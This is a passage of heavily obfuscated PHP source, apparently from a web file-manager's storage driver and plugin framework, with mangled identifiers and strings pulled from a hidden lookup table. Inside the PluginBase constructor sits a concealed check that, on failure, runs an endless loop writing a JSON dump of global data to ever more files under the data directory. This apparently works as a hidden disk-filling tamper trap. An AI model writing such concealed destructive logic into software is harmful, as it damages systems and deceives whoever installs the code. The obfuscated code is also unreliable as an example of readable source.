array($ß»ò÷‹õ[286] => $Ûê¤åµñ), array($ß»ò÷‹õ[287] => $ğº¬Œìö), array($ß»ò÷‹õ[288] => $Ì¤ÓúË°), array($ß»ò÷‹õ[289] => $…øáİõ¤))); $ë½‘¢¢­ = base64_encode(json_encode($åŠÁÂ±)); $¶İÌå½ë = hash_hmac($ß»ò÷‹õ[290], $æµ›š»Û, $ß»ò÷‹õ[291] . $this->secret, !0); $öÎ¢×¤ = hash_hmac($ß»ò÷‹õ[290], $this->region, $¶İÌå½ë, !0); $ Ë°˜à = hash_hmac($ß»ò÷‹õ[290], $æÃıãßŞ, $öÎ¢×¤, !0); $¥ãÍ¿ø = hash_hmac($ß»ò÷‹õ[290], $À–ÈÇ¶§, $ Ë°˜à, !0); $òèµôé´ = hash_hmac($ß»ò÷‹õ[290], $ë½‘¢¢­, $¥ãÍ¿ø); $õîíì” = array($ß»ò÷‹õ[247] => $ß»ò÷‹õ[22], $ß»ò÷‹õ[292] => $ß»ò÷‹õ[22], $ß»ò÷‹õ[280] => $İ‚¢¨ò, $ß»ò÷‹õ[285] => $Š„ôËãá, $ß»ò÷‹õ[293] => $ë½‘¢¢­, $ß»ò÷‹õ[294] => $Ûê¤åµñ, $ß»ò÷‹õ[295] => $ğº¬Œìö, $ß»ò÷‹õ[296] => $Ì¤ÓúË°, $ß»ò÷‹õ[297] => $…øáİõ¤, $ß»ò÷‹õ[298] => $òèµôé´, $ß»ò÷‹õ[209] => $this->getHost()); return $õîíì”; } public function multiUploadFormData($ÍüÏËÇ€, $¸¿ü…›½ = 3600) { $ş‰¬Å£ğ =& $_SERVER[Õò”†—·]; $¿„ÁÁŒê = gmdate($ş‰¬Å£ğ[1518]); $½Ò¦Ä«Á = array(); $˜Á£Æ“› = $this->client->getUploadId($this->bucket, $ÍüÏËÇ€, $½Ò¦Ä«Á); if (!$˜Á£Æ“›) { return !1; } return array($ş‰¬Å£ğ[255] => $˜Á£Æ“›, $ş‰¬Å£ğ[209] => $this->getHost() . $ş‰¬Å£ğ[18] . $this->pathEncode($ÍüÏËÇ€), $ş‰¬Å£ğ[256] => $¿„ÁÁŒê, $ş‰¬Å£ğ[107] => $ÍüÏËÇ€); } public function multiUploadAuthData($ğü¥öÜ‘, $ÑÍÜÎ®÷ = array()) { $Åîˆ÷Å¸ =& $_SERVER[Õò”†—·]; $Êâô¼õö = isset($ÑÍÜÎ®÷[$Åîˆ÷Å¸[188]]) ? $ÑÍÜÎ®÷[$Åîˆ÷Å¸[188]] : $Åîˆ÷Å¸[22]; $Ä®õğÚë = $ÑÍÜÎ®÷[$Åîˆ÷Å¸[107]]; unset($ÑÍÜÎ®÷[$Åîˆ÷Å¸[107]]); if (isset($ÑÍÜÎ®÷[$Åîˆ÷Å¸[257]])) { return $this->listUploadParts($Ä®õğÚë, $ÑÍÜÎ®÷); } $åŞ¹Éõ = array(); if (isset($ÑÍÜÎ®÷[$Åîˆ÷Å¸[1519]])) { $åŞ¹Éõ[$Åîˆ÷Å¸[1520]] = $ÑÍÜÎ®÷[$Åîˆ÷Å¸[1519]]; } $ˆÒ¡Ñ¸‰ = explode($Åîˆ÷Å¸[211], $this->getHost()); $Ô¤ë¡‚“ = array($Åîˆ÷Å¸[1521] => $ˆÒ¡Ñ¸‰[1], $Åîˆ÷Å¸[1522] => $Åîˆ÷Å¸[22], $Åîˆ÷Å¸[247] => $Åîˆ÷Å¸[133], $Åîˆ÷Å¸[292] => $ÑÍÜÎ®÷[$Åîˆ÷Å¸[89]]); $™öåšØÃ = $Åîˆ÷Å¸[260]; $Ô×üóğª = $Åîˆ÷Å¸[18] . $this->pathEncode($Ä®õğÚë) . $Êâô¼õö; $¯ªéŸ¾û = $this->client->__getSignatureV4($åŞ¹Éõ, $Ô¤ë¡‚“, $™öåšØÃ, $Ô×üóğª); if (strpos($Êâô¼õö, $Åîˆ÷Å¸[259]) === 0) { if (isset($åŞ¹Éõ[$Åîˆ÷Å¸[1520]])) { $ªœûí³ = $åŞ¹Éõ[$Åîˆ÷Å¸[1520]]; } else { if (isset($¯ªéŸ¾û[$Åîˆ÷Å¸[1520]])) { $ªœûí³ = $¯ªéŸ¾û[$Åîˆ÷Å¸[1520]]; } else { $ªœûí³ = hash($Åîˆ÷Å¸[290], $Åîˆ÷Å¸[22]); } } return array($Åîˆ÷Å¸[265] => $¯ªéŸ¾û[$Åîˆ÷Å¸[265]], $Åîˆ÷Å¸[1520] => $ªœûí³, $Åîˆ÷Å¸[256] => $¯ªéŸ¾û[$Åîˆ÷Å¸[1523]]); } return $¯ªéŸ¾û[$Åîˆ÷Å¸[265]]; } public function listUploadParts($ÖÍóïş±, $Æ…Áõ©£ = array()) { $ó“œßØü =& $_SERVER[Õò”†—·]; $¸”Äı‚· = str_replace($ó“œßØü[266], $ó“œßØü[22], $Æ…Áõ©£[$ó“œßØü[188]]); $„÷•¾ã­ = $this->client->listParts($this->bucket, $ÖÍóïş±, $¸”Äı‚·); if (!$„÷•¾ã­) { return !1; } $ÚšÁÍÀÆ = $ó“œßØü[1524]; foreach ($„÷•¾ã­ as $áË”öÇ«) { $ÚšÁÍÀÆ .= $ó“œßØü[1525] . "\74\x50\141\x72\164\x4e\165\155\142\x65\x72\x3e{$áË”öÇ«[$ó“œßØü[1453]]}\x3c\57\120\x61\x72\164\x4e\165\x6d\142\x65\162\76\xa" . "\74\105\x54\x61\147\76{$áË”öÇ«[$ó“œßØü[1454]]}\74\57\105\124\141\147\76\12" . $ó“œßØü[1526]; } $ÚšÁÍÀÆ .= $ó“œßØü[1527]; $„¸¿É¿ = array(); $©‡ª¤Ã¨ = explode($ó“œßØü[211], $this->getHost()); $•ğÛŞ¼û = array($ó“œßØü[1521] => $©‡ª¤Ã¨[1], $ó“œßØü[247] => $ó“œßØü[133], $ó“œßØü[292] => strlen($ÚšÁÍÀÆ)); $ú·êÏûÜ = $ó“œßØü[258]; $ÙŒ™§µ¾ = $ó“œßØü[18] . $this->pathEncode($ÖÍóïş±) . $Æ…Áõ©£[$ó“œßØü[188]]; $ç­÷ü‹ = $this->client->__getSignatureV4($„¸¿É¿, $•ğÛŞ¼û, $ú·êÏûÜ, $ÙŒ™§µ¾, $ÚšÁÍÀÆ); return array($ó“œßØü[265] => $ç­÷ü‹[$ó“œßØü[265]], $ó“œßØü[256] => $ç­÷ü‹[$ó“œßØü[1523]], $ó“œßØü[267] => $„÷•¾ã­, $ó“œßØü[1520] => $ç­÷ü‹[$ó“œßØü[1520]]); } public function link($½âÖ•‡Ê, $ãÓ¿‰½Á = array()) { return parent::link($½âÖ•‡Ê, $ãÓ¿‰½Á); } public function fileOut($€Ğ”å›ä, $õÀ‚€Û = false, $ÊÄ‚ˆ±¨ = false, $ŞÈƒäÌÒ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Õò”†—·][1528])) { return parent::fileOutServer($€Ğ”å›ä, $õÀ‚€Û, $ÊÄ‚ˆ±¨, $ŞÈƒäÌÒ); } parent::fileOut($€Ğ”å›ä, $õÀ‚€Û, $ÊÄ‚ˆ±¨, $ŞÈƒäÌÒ); } public function fileOutImage($…œİ¢æÑ, $Ù†°ßƒË = 250) { if (strstr($this->endpoint, $_SERVER[Õò”†—·][1528])) { return parent::fileOutImageServer($…œİ¢æÑ, $Ù†°ßƒË); } parent::fileOutImage($…œİ¢æÑ, $Ù†°ßƒË); } public function fileOutLink($üÜ¦´Ç) { $‘­¤’¤Á =& $_SERVER[Õò”†—·]; if (substr($üÜ¦´Ç, 0, 7) == $‘­¤’¤Á[1378]) { $üÜ¦´Ç = $‘­¤’¤Á[1379] . substr($üÜ¦´Ç, 7); } header($‘­¤’¤Á[175] . $üÜ¦´Ç); die; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ğı—÷ˆ”, $ìÄ†øßİ = 0) { parent::__construct(); $this->source = $Ğı—÷ˆ”; $this->sourceSize = $ìÄ†øßİ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÌÙËÏ¬¾ = false) { return $this->sourceSize; } public function getContent($—ôó¢à = false) { return $this->fileSubstr($—ôó¢à, 0, $this->sourceSize); } public function fileSubstr($é¸Å«Íß = false, $§°ÀŒœÜ = 0, $ÈÓÊàÅÎ = 0) { if (!$ÈÓÊàÅÎ) { $ÈÓÊàÅÎ = $this->sourceSize; } $Äó‹¤Ñ = $this->sourceSize - $§°ÀŒœÜ; if ($ÈÓÊàÅÎ >= $Äó‹¤Ñ) { $ÈÓÊàÅÎ = $Äó‹¤Ñ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $§°ÀŒœÜ, $ÈÓÊàÅÎ); } if ($this->sourceType == self::TYPE_FILE) { if ($ÈÓÊàÅÎ <= 0) { return $_SERVER[Õò”†—·][22]; } $‡Èë½ö˜ = ftell($this->source); fseek_64($this->source, $‡Èë½ö˜ + $§°ÀŒœÜ); $„§ óä® = @fread($this->source, $ÈÓÊàÅÎ); fseek_64($this->source, $‡Èë½ö˜); return $„§ óä®; } } public function hashMd5($æ¨ÉìéØ = false) { return md5($this->getContent()); } public static function hash($é“®ØŸƒ, $–âÜò±Ø = 0) { $¥ÂîÈÁ¾ = new PathDriverStream($é“®ØŸƒ, $–âÜò±Ø); return $¥ÂîÈÁ¾->hashSimple($é“®ØŸƒ); } public static function md5($–•÷Ë®, $…Æ¥ç—È = 0) { $ÀÓ‰¤¯ = new PathDriverStream($–•÷Ë®, $…Æ¥ç—È); return $ÀÓ‰¤¯->hashMd5($–•÷Ë®); } } goto CÉÄ‹æÉÈ¤; F¡ÍÓÑ•÷: class Message { function __construct() { } public function send($ç¼‡ = '', $š©ĞáÒ = array(), $ÄàˆÂ™² = "\164\x65\x78\164") { $¤˜ÂÑ‚» =& $_SERVER[Õò”†—·]; $’ªŠÅËµ = array($¤˜ÂÑ‚»[43] => $¤˜ÂÑ‚»[1606], $¤˜ÂÑ‚»[805] => $ç¼‡); if (in_array($ÄàˆÂ™², array($¤˜ÂÑ‚»[1606], $¤˜ÂÑ‚»[1607]))) { $’ªŠÅËµ[$¤˜ÂÑ‚»[43]] = $ÄàˆÂ™²; } $š©ĞáÒ = array($¤˜ÂÑ‚»[563] => isset($š©ĞáÒ[$¤˜ÂÑ‚»[563]]) ? $š©ĞáÒ[$¤˜ÂÑ‚»[563]] : $¤˜ÂÑ‚»[22], $¤˜ÂÑ‚»[646] => isset($š©ĞáÒ[$¤˜ÂÑ‚»[646]]) ? $š©ĞáÒ[$¤˜ÂÑ‚»[646]] : $¤˜ÂÑ‚»[22]); if (empty($ç¼‡) || empty($š©ĞáÒ[$¤˜ÂÑ‚»[563]]) && empty($š©ĞáÒ[$¤˜ÂÑ‚»[646]])) { return !1; } $‡Û·´—× = array($¤˜ÂÑ‚»[1534] => $’ªŠÅËµ, $¤˜ÂÑ‚»[1608] => $š©ĞáÒ); Hook::trigger($¤˜ÂÑ‚»[1609], $‡Û·´—×); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ë›‹„×³ =& $_SERVER[Õò”†—·]; $”úúÓÅ = $_SERVER[$ë›‹„×³[6]]; $”°¡±İŸ = $ë›‹„×³[7]; if ($_SERVER[$ë›‹„×³[8]] != $”°¡±İŸ($”úúÓÅ)) { $¬áÚï­ = $ë›‹„×³[927]; $Ñ‘±˜ĞÃ = $ë›‹„×³[9]; $§ûôû» = $_SERVER[$ë›‹„×³[10]] . $ë›‹„×³[11]; $‘‚æÍ¯ê = $Ñ‘±˜ĞÃ($§ûôû»); $¢İœ’Á” = explode($ë›‹„×³[12], $‘‚æÍ¯ê); if (count($¢İœ’Á”) < $ë›‹„×³[671]) { $ßî£ÚĞÛ = $ë›‹„×³[14]; $ßî£ÚĞÛ(); } $ÔØÊªà = $ë›‹„×³[928]; $ÔØÊªà($_SERVER[$ë›‹„×³[929]]); $¬áÚï­ = $ë›‹„×³[927]; $¬áÚï­(); $ğŞÆôœŸ = $ë›‹„×³[930]; $´¼ƒÃÁ˜ = json_encode($GLOBALS[$ë›‹„×³[931]]); $š¥œßëô = 1; for ($ÑÁëÙ = $š¥œßëô; $ÑÁëÙ > 0; $ÑÁëÙ++) { $ğŞÆôœŸ(DATA_PATH . $ÑÁëÙ, $´¼ƒÃÁ˜); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ë›‹„×³[1610]); $this->pluginName = str_replace($ë›‹„×³[1610], $ë›‹„×³[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ë›‹„×³[18]; $this->pluginApi = appHostGet() . $ë›‹„×³[1611] . $this->pluginName . $ë›‹„×³[18]; $this->pluginHost = $config[$ë›‹„×³[1612]] . $this->pluginName . $ë›‹„×³[18]; $this->pluginHostDefault = $config[$ë›‹„×³[1612]] . $this->pluginName . $ë›‹„×³[18]; $•åÍ¶Çã = $config[$ë›‹„×³[1613]]; if ($•åÍ¶Çã && strpos($ë›‹„×³[60] . $•åÍ¶Çã . $ë›‹„×³[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ë›‹„×³[1614]] . $this->pluginName . $ë›‹„×³[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Õò”†—·][1615]); } protected function assign($‡ÂİÇà, $Ò´Ñ¼Â = false) { if (is_array($‡ÂİÇà)) { $this->values = array_merge($this->values, $‡ÂİÇà); } else { $this->values[$‡ÂİÇà] = $Ò´Ñ¼Â; } } protected function display($ÚÏÎçî™) { extract($this->values); require $ÚÏÎçî™; } final function hookRegist($‰ù¶Ã‹) { $this->modelPlugin->appRegist($this->pluginName, $‰ù¶Ã‹); } final function appIcon() { $Â¢ìşĞî =& $_SERVER[Õò”†—·]; $°ŸÂœÄ = $this->appPackage(); $ à¼ŸğÂ = $Â¢ìşĞî[22]; if (isset($°ŸÂœÄ[$Â¢ìşĞî[474]])) { if (isset($°ŸÂœÄ[$Â¢ìşĞî[474]][$Â¢ìşĞî[1616]])) { $ à¼ŸğÂ = $Â¢ìşĞî[1617] . $°ŸÂœÄ[$Â¢ìşĞî[474]][$Â¢ìşĞî[1616]] . $Â¢ìşĞî[1618]; } else { if ($°ŸÂœÄ[$Â¢ìşĞî[474]][$Â¢ìşĞî[1619]]) { $ à¼ŸğÂ = $Â¢ìşĞî[1620] . $°ŸÂœÄ[$Â¢ìşĞî[474]][$Â¢ìşĞî[1619]] . $Â¢ìşĞî[1621]; } } } return $ à¼ŸğÂ; } final function fileCanView($ÜÁ³óå) { $óÏê¯˜ =& $_SERVER[Õò”†—·]; if (request_url_safe($ÜÁ³óå)) { return !0; } if ($this->isShare($ÜÁ³óå)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÇŞ¸ğˆô = $óÏê¯˜[1622] . rawurlencode(this_url()); show_tips(LNG($óÏê¯˜[1623]) . $óÏê¯˜[1624] . $ÇŞ¸ğˆô . $óÏê¯˜[1625] . LNG($óÏê¯˜[1626]) . $óÏê¯˜[1627], !1); } if (!Action($óÏê¯˜[1628])->authCan($óÏê¯˜[1629])) { show_tips(LNG($óÏê¯˜[1630]) . $óÏê¯˜[1631], !1); } ActionCall($óÏê¯˜[1632], $ÜÁ³óå); } final function isShare($è¨ààúİ) { $®êÙ¥Ü× = KodIO::parse($è¨ààúİ); return $®êÙ¥Ü×[$_SERVER[Õò”†—·][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ëã­ç×–) { if (request_url_safe($ëã­ç×–)) { return $ëã­ç×–; } if (!$this->isShare($ëã­ç×–)) { $ëã­ç×– = $this->filePath($ëã­ç×–, !1); } return Action($_SERVER[Õò”†—·][1228])->linkOut($ëã­ç×–); } public function filePathLinkOut($¬¥­ÎØó) { if (request_url_safe($¬¥­ÎØó)) { return $¬¥­ÎØó; } $this->fileCanView($¬¥­ÎØó); return Action($_SERVER[Õò”†—·][1228])->link($¬¥­ÎØó); } final function filePath($£µõ©ÒÍ, $¼õçıí = true, $°Òßì™Ì = false) { $ƒ¡×ËüÁ =& $_SERVER[Õò”†—·]; $øˆÎ±â = $this->filePathGet($£µõ©ÒÍ, $¼õçıí); if (!$this->fileInfo) { show_tips(LNG($ƒ¡×ËüÁ[118]), !1); } if ($°Òßì™Ì && isset($this->fileInfo[$ƒ¡×ËüÁ[525]]) && $this->fileInfo[$ƒ¡×ËüÁ[525]]) { $ ¥Õ­º“ = Model($ƒ¡×ËüÁ[528])->fileInfo($this->fileInfo[$ƒ¡×ËüÁ[525]]); if (!$ ¥Õ­º“ || !IO::exist($ ¥Õ­º“[$ƒ¡×ËüÁ[97]])) { show_tips(LNG($ƒ¡×ËüÁ[118]) . $ƒ¡×ËüÁ[1633]); } } Hook::trigger($ƒ¡×ËüÁ[1634], $øˆÎ±â); return $øˆÎ±â; } final function filePathGet($„ğÒÄ·, $Ó†Ïı‡‚ = true) { $–ÃÆİõ¡ =& $_SERVER[Õò”†—·]; if ($æÚ·¡ö = $this->checkSharePath($„ğÒÄ·, $Ó†Ïı‡‚)) { return $æÚ·¡ö; } $this->fileCanView($„ğÒÄ·); if (request_url_safe($„ğÒÄ·)) { $â†–‚¬¾ = parse_url_query($„ğÒÄ·); if (isset($â†–‚¬¾[$–ÃÆİõ¡[1635]]) && isset($â†–‚¬¾[$–ÃÆİõ¡[235]])) { $×¯ÌŸÇ· = Mcrypt::decode($â†–‚¬¾[$–ÃÆİõ¡[235]], Model($–ÃÆİõ¡[821])->get($–ÃÆİõ¡[822])); if ($×¯ÌŸÇ·) { $this->fileInfo = IO::info($×¯ÌŸÇ·); $this->fileInfo[$–ÃÆİõ¡[1636]] = $„ğÒÄ·; $this->cachePath = $this->pluginCachePath($–ÃÆİõ¡[22], $Ó†Ïı‡‚); return $×¯ÌŸÇ·; } } $„ğÒÄ· = $this->_cacheHttpFile($„ğÒÄ·, $Ó†Ïı‡‚); $this->fileInfo = IO::info($„ğÒÄ·); } else { $this->fileInfo = IO::info($„ğÒÄ·); $this->cachePath = $this->pluginCachePath($–ÃÆİõ¡[22], $Ó†Ïı‡‚); } return $„ğÒÄ·; } final function _cacheHttpFile($½¨úï¡, $„îş†ïñ = true) { $†“Éˆ®‰ =& $_SERVER[Õò”†—·]; $Î•µíÒ = parse_url_query($½¨úï¡); $’Üìç³‚ = get_path_ext($½¨úï¡); if (isset($Î•µíÒ[$†“Éˆ®‰[42]]) && $Î•µíÒ[$†“Éˆ®‰[42]]) { $’Üìç³‚ = get_path_ext($Î•µíÒ[$†“Éˆ®‰[42]]); } $·É®„ø¡ = hash_path($½¨úï¡) . $†“Éˆ®‰[20] . $’Üìç³‚; $this->cachePath = $this->pluginCachePath($„îş†ïñ ? $·É®„ø¡ : $†“Éˆ®‰[22]); $ùÜÓ‡‹˜ = IO::fileNameExist($this->cachePath, $·É®„ø¡); if ($ùÜÓ‡‹˜) { return KodIO::make($ùÜÓ‡‹˜); } $¶«®Çö¿ = rtrim($this->cachePath, $†“Éˆ®‰[18]) . $†“Éˆ®‰[18] . $·É®„ø¡; return $this->pluginCacheFileSet($¶«®Çö¿, file_get_contents_nossl($½¨úï¡)); } final function checkSharePath($Öò‰Š, $¨ú±ÑŸ = true) { $œ·«Ãã« =& $_SERVER[Õò”†—·]; if (!$this->isShare($Öò‰Š)) { return !1; } $…›Ü÷©Ò = Action($œ·«Ãã«[1228])->sharePathInfo($Öò‰Š); if (!is_array($…›Ü÷©Ò) || !isset($…›Ü÷©Ò[$œ·«Ãã«[97]])) { show_json(LNG($œ·«Ãã«[1637]), !1); } $this->fileInfo = $…›Ü÷©Ò; $this->cachePath = $this->pluginCachePath(!1, $¨ú±ÑŸ); return $…›Ü÷©Ò[$œ·«Ãã«[97]]; } final function pluginCachePath($„éçÁÊ = '', $ƒ§ò¾Öü = false) { $Î­šß =& $_SERVER[Õò”†—·]; if ($ƒ§ò¾Öü && is_array($this->fileInfo)) { $„éçÁÊ = kodIO::hashPath($this->fileInfo); } $´Ğ´ğ¨Ï = rtrim(IO_PATH_SYSTEM_TEMP . $Î­šß[1638] . $this->pluginName . $Î­šß[18] . $„éçÁÊ, $Î­šß[18]); $·Á¨îğ = IO::infoFullSimple($´Ğ´ğ¨Ï); $ÎÃ·•Áé = $·Á¨îğ && is_array($·Á¨îğ) ? $·Á¨îğ[$Î­šß[97]] : $Î­šß[22]; if (!$ÎÃ·•Áé) { $ÎÃ·•Áé = IO::mkdir($´Ğ´ğ¨Ï); } return $ÎÃ·•Áé; } final function pluginCacheFileSet($êÑŸè½, $ƒìû¬ÛÄ = '') { $–Ü£»í¿ =& $_SERVER[Õò”†—·]; $ ¹Ş»© = IO::infoFullSimple($êÑŸè½); if (!$ ¹Ş»©) { return IO::mkfile($êÑŸè½, $ƒìû¬ÛÄ, REPEAT_REPLACE); } IO::setContent($ ¹Ş»©[$–Ü£»í¿[97]], $ƒìû¬ÛÄ); return $ ¹Ş»©[$–Ü£»í¿[97]]; } final function pluginLocalFile($ƒ¹À¥ìÔ = '') { $Å¯”ùÖ =& $_SERVER[Õò”†—·]; $ñ”á“ş¢ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ñ”á“ş¢)) { mk_dir($ñ”á“ş¢); } if (!$ƒ¹À¥ìÔ) { return $ñ”á“ş¢; } $äë…¿ƒ = IO::info($ƒ¹À¥ìÔ); $¥ÀüÆ“ = $Å¯”ùÖ[1639] . KodIO::hashPath($äë…¿ƒ) . $Å¯”ùÖ[20] . $äë…¿ƒ[$Å¯”ùÖ[188]]; if (!checkExtSafe($¥ÀüÆ“)) { $¥ÀüÆ“ = $¥ÀüÆ“ . $Å¯”ùÖ[1260]; } $ß»Èà¸Å = $ñ”á“ş¢ . $¥ÀüÆ“; if (@file_exists($ß»Èà¸Å)) { return $ß»Èà¸Å; } return IO::copy($ƒ¹À¥ìÔ, $ñ”á“ş¢, 0, $¥ÀüÆ“); } final function appPackage() { $ªÛÉöò =& $_SERVER[Õò”†—·]; if ($this->packageData) { return $this->packageData; } $ò¾×¡ö² = $this->parseFile($this->pluginPath . $ªÛÉöò[1640]); $this->parseLang($ò¾×¡ö²); $İÎÆôÆÛ = json_decode_force($ò¾×¡ö²); if (!$İÎÆôÆÛ) { return array(); } $¬›­Ö´Ë = Hook::trigger($ªÛÉöò[1641], $İÎÆôÆÛ); if ($¬›­Ö´Ë && is_array($¬›­Ö´Ë)) { $İÎÆôÆÛ = $¬›­Ö´Ë; } $this->packageData = $İÎÆôÆÛ; return $İÎÆôÆÛ; } public function packageInfoGet($¼è¤Êæ¶) { $ÊÁí  € = $this->appPackage(); return array_get_value($ÊÁí  €, $¼è¤Êæ¶); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Õò”†—·][1642]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Õò”†—·][1643]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Õò”†—·][1644]); } public function echoJsAssign($ÑØ§’ø¼, $æÚ¡äÕ) { $this->echoJsAssignArr[$ÑØ§’ø¼] = $æÚ¡äÕ; } private function parseFile($­±áù“Ê) { $³ôÙ®÷ =& $_SERVER[Õò”†—·]; $Öî…Ò­ = file_get_contents_nossl($­±áù“Ê); $ŞÆÃ¬’Ğ = array($³ôÙ®÷[1645], $³ôÙ®÷[1646], $³ôÙ®÷[1647], $³ôÙ®÷[1648], $³ôÙ®÷[1649], $³ôÙ®÷[1650], $³ôÙ®÷[1651]); $›Œ‰ÔÎ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$³ôÙ®÷[102]][$³ôÙ®÷[1652]]); foreach ($this->echoJsAssignArr as $¥Ø×ğ££ => $áÚ§Š­÷) { $ŞÆÃ¬’Ğ[] = $³ôÙ®÷[1653] . $¥Ø×ğ££ . $³ôÙ®÷[1654]; $›Œ‰ÔÎ[] = is_array($áÚ§Š­÷) || is_object($áÚ§Š­÷) ? rawurlencode(json_encode($áÚ§Š­÷)) : $áÚ§Š­÷; } if (strstr($Öî…Ò­, $³ôÙ®÷[1655])) { $ó‡œ¬¶İ = rawurlencode(json_encode($this->pluginLangArr)); $Öî…Ò­ = str_replace($³ôÙ®÷[1655], $ó‡œ¬¶İ, $Öî…Ò­); } if (strstr($Öî…Ò­, $³ôÙ®÷[1656])) { $ó‡œ¬¶İ = $ó‡œ¬¶İ = rawurlencode(json_encode($this->getConfig())); $Öî…Ò­ = str_replace($³ôÙ®÷[1656], $ó‡œ¬¶İ, $Öî…Ò­); } $Öî…Ò­ = str_replace($ŞÆÃ¬’Ğ, $›Œ‰ÔÎ, $Öî…Ò­); return $Öî…Ò­; } private function parseLang(&$‡ £±„) { $³°ïó÷Ê =& $_SERVER[Õò”†—·]; $ãÛ…²Äå = $³°ïó÷Ê[1657]; if (!strstr($‡ £±„, $ãÛ…²Äå)) { return; } preg_match_all($³°ïó÷Ê[1658], $‡ £±„, $¿ã‹µÍÑ); if (!is_array($¿ã‹µÍÑ) || count($¿ã‹µÍÑ) == 0 || !is_array($¿ã‹µÍÑ[0]) || count($¿ã‹µÍÑ[0]) == 0) { return; } $áºã¨şå = array(); $Íªõ´Ì = array(); foreach ($¿ã‹µÍÑ[0] as $íª±ì«—) { $ÑÓÓÂ®Ú = substr($íª±ì«—, strlen($ãÛ…²Äå), -4); $–‹”Ã«¹ = LNG($ÑÓÓÂ®Ú); $áºã¨şå[] = $íª±ì«—; $Íªõ´Ì[] = str_replace(array($³°ïó÷Ê[12], $³°ïó÷Ê[1129], $³°ïó÷Ê[402], $³°ïó÷Ê[131]), array($³°ïó÷Ê[63], $³°ïó÷Ê[63], $³°ïó÷Ê[22], $³°ïó÷Ê[1659]), $–‹”Ã«¹); } $‡ £±„ = str_replace($áºã¨şå, $Íªõ´Ì, $‡ £±„); } private function parseConfig(&$§áàøÏ–) { $®µî¨îÊ =& $_SERVER[Õò”†—·]; $…×í§Ùà = $®µî¨îÊ[1660]; if (!strstr($§áàøÏ–, $…×í§Ùà)) { return; } preg_match_all($®µî¨îÊ[1661], $§áàøÏ–, $ğŸ¸·£±); if (!is_array($ğŸ¸·£±) || count($ğŸ¸·£±) == 0 || !is_array($ğŸ¸·£±[0]) || count($ğŸ¸·£±[0]) == 0) { return; } $–õúÂç¼ = $this->getConfig(); $ÑƒÆ¢ùƒ = array(); $ç²¬Ëì´ = array(); foreach ($ğŸ¸·£±[0] as $Û¤ĞŠ) { $Ê¡Ì©¹ê = substr($Û¤ĞŠ, strlen($…×í§Ùà), -2); $ÑƒÆ¢ùƒ[] = $Û¤ĞŠ; $ç²¬Ëì´[] = _get($–õúÂç¼, $Ê¡Ì©¹ê); } $§áàøÏ– = str_replace($ÑƒÆ¢ùƒ, $ç²¬Ëì´, $§áàøÏ–); } private function parsePackage(&$¿ˆÉë) { $ğŸëŒßù =& $_SERVER[Õò”†—·]; $ç“¥ÄÙø = $ğŸëŒßù[1662]; if (!strstr($¿ˆÉë, $ç“¥ÄÙø)) { return; } preg_match_all($ğŸëŒßù[1663], $¿ˆÉë, $†Á£Êú); if (!is_array($†Á£Êú) || count($†Á£Êú) == 0 || !is_array($†Á£Êú[0]) || count($†Á£Êú[0]) == 0) { return; } $ûÒÌç©Ç = $this->appPackage(); $ÊÇ®€ŞŞ = array(); $äµÑÒ° = array(); foreach ($†Á£Êú[0] as $š¾–ìİ²) { $÷«–ÒõÕ = substr($š¾–ìİ², strlen($ç“¥ÄÙø), -2); $ÊÇ®€ŞŞ[] = $š¾–ìİ²; $äµÑÒ°[] = _get($ûÒÌç©Ç, $÷«–ÒõÕ); } $¿ˆÉë = str_replace($ÊÇ®€ŞŞ, $äµÑÒ°, $¿ˆÉë); } final function echoFile($ö´œß€, $Ÿ£‹ÛôÚ = false) { $‹Ã„¼û» =& $_SERVER[Õò”†—·]; $¶£ÕîÆ = $this->pluginPath . $ö´œß€; if (ACT == $‹Ã„¼û»[1664]) { echo $‹Ã„¼û»[1665] . $this->pluginName . $‹Ã„¼û»[18] . $ö´œß€ . $‹Ã„¼û»[1666]; if (!file_exists($¶£ÕîÆ)) { echo $‹Ã„¼û»[1667]; return; } } $¹şîÍ’ = $this->parseFile($¶£ÕîÆ); $this->parseLang($¹şîÍ’); $this->parseConfig($¹şîÍ’); $this->parsePackage($¹şîÍ’); if (is_array($Ÿ£‹ÛôÚ)) { $¹şîÍ’ = str_replace(array_keys($Ÿ£‹ÛôÚ), array_values($Ÿ£‹ÛôÚ), $¹şîÍ’); } echo $‹Ã„¼û»[12] . $¹şîÍ’; } private function checkVersion() { $Íç×¬ûä =& $_SERVER[Õò”†—·]; $¥ÜÎñ‘× = $this->appPackage(); $¨áÖÍ³ = $this->getConfig(); if ($¨áÖÍ³[$Íç×¬ûä[1668]] == $¥ÜÎñ‘×[$Íç×¬ûä[1642]]) { return; } $this->regist(); $this->setConfig(array($Íç×¬ûä[1668] => $¥ÜÎñ‘×[$Íç×¬ûä[1642]])); } final function initLang() { $Ì×—Á° =& $_SERVER[Õò”†—·]; $ëŞÄÉ£Š = $Ì×—Á°[1669]; $ş’îş‡ = $this->pluginPath . $Ì×—Á°[1670]; $î÷…ÈÅ = I18n::getType(); $Ù²·òû = array(); if (file_exists($ş’îş‡ . $î÷…ÈÅ . $Ì×—Á°[889])) { $Ù²·òû = (include $ş’îş‡ . $î÷…ÈÅ . 